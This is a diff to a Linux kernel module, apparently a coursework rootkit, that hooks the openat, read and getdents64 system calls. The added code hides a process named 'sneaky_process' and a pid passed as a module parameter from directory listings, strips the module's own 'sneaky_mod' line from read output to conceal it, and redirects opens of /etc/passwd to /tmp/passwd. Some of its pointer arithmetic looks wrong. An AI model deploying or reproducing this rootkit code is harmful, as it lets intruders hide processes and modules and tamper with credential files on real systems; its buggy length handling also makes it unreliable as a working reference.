@@ -13,6 +13,10 @@
 
 #define PREFIX "sneaky_process"
 
+static char * pid = "";
+module_param(pid, charp, 0);
+MODULE_PARM_DESC(pid, "pid");
+
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
@@ -42,33 +46,31 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
-  int dirfd = regs->di;
-  const char * pathname = regs->si;
-  int flags = regs->dx;
+  const char * pathname = (const char *)regs->si;
   if (strcmp(pathname, "/etc/passwd") == 0) {
     copy_to_user((char*)pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
   }
-  int ans = original_openat(dirfd, pathname, flags);
-  return ans;
+  return original_openat(regs);
 }
 
 
 asmlinkage int (*original_read)(struct pt_regs *);
 // Define your new sneaky version of the 'read' syscall
-asmlinkage int sneaky_sys_read(struct pt_regs *regs)
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
 {
+  char* has_sneaky = NULL;
+  char* end = NULL;
   // Implement the sneaky part here
-  int fd = regs->di;
-  void* buf = regs->si;
-  size_t count = regs->dx;
-  int ans = original_read(fd, buf, count);
+  void* buf = (void*)regs->si;
+  ssize_t ans = original_read(regs);
   if (ans <= 0) return ans;
-  char* has_sneaky = strnstr(buf, "sneaky_mod", ans);
-  if (has_sneaky == null) return ans;
-  char* end = strnstr(has_sneaky, "\n", ans - (has_sneaky - buf));
-  if (end == null) return ans;
-  memmove(has_sneaky, end, ans - (end + 1 - buf));
+  has_sneaky = strnstr(buf, "sneaky_mod ", ans);
+  if (has_sneaky == NULL) return ans;
+  end = strchr(has_sneaky, '\n');
+  if (end == NULL) return ans;
+  memmove(has_sneaky, end, ans - ((void*)end + 1 - (void*)buf));
   ans = ans + end + 1 - has_sneaky;
+  return ans;
 }
 
 
@@ -78,15 +80,14 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
 {
   // Implement the sneaky part here
   int ans;
-  int fd = (int)(reg->di);
-  struct linux_dirent64 * head = reg->si;
+  int i;
+  struct linux_dirent64 * head = (struct linux_dirent64 *)regs->si;
   struct linux_dirent64 * cur = head;
-  int count = (int)(regs->dx);
-  ans = original_getdents64(fd, head, count);
-  for (int i = 0; i < ans;) {
-    if ((strcmp(cur->d_name, file == 0)||(strcmp(cur->d_name, file) == 0)){
+  ans = original_getdents64(regs);
+  for (i = 0; i < ans;) {
+    if ((strcmp(cur->d_name, "sneaky_process") == 0)||(strcmp(cur->d_name, pid) == 0)){
       char * next = (char*)cur + cur->d_reclen;
-      int len = ans - ((int)next - (int)head);
+      int len = ans - ((void*)next - (void*)head);
       ans -= cur->d_reclen;
       memmove(cur, next, len);
     }
